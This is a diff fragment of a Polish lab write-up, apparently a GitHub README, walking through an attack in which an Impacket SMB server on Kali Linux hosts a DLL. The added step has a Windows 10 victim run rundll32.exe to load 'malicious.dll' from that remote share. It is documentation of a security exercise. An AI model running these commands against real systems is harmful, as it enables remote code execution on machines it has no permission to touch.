@@ -31,3 +31,12 @@ Atakujący na maszynie Kali Linux przygotowuje folder roboczy oraz uruchamia ser
 * **Komenda (Kali Linux):**
   ```
   sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /tmp/smbFolder -smb2support ``` 
+
+### Krok 3: Egzekucja ataku sieciowego z poziomu Windows 10
+Na stacji roboczej ofiary uruchomiłem wiersz poleceń (cmd.exe), wywołując rundll32.exe i wskazując ścieżkę UNC prowadzącą bezpośrednio do maszyny Kali Linux oraz eksportowaną funkcję biblioteki.
+
+<img width="535" height="285" alt="2" src="https://github.com/user-attachments/assets/83854c9a-ac3d-4ec9-8c9e-5b19860b188a" />
+
+* **Komenda (Windows - CMD):**
+  ```
+  rundll32.exe \\192.168.0.107\share\malicious.dll,EntryPoint
